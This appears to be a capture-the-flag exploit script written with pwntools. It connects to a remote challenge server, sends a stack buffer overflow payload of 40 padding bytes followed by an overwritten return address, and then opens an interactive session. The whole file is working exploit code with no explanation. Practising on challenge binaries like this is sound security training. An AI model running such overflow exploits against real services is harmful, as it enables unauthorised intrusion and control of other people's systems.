from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

# e = context.binary = ELF('./pwn3')
# r= e.process()
# r= e.process()
r = remote('earn-much-money-d2056548.dailycookie.cloud', 30921)
# lib = e.libc

# ------------------------------

payload = b"a"*32+b"b"*8
payload+= flat(0x40115E)
pause()
r.sendline(payload)

r.interactive()
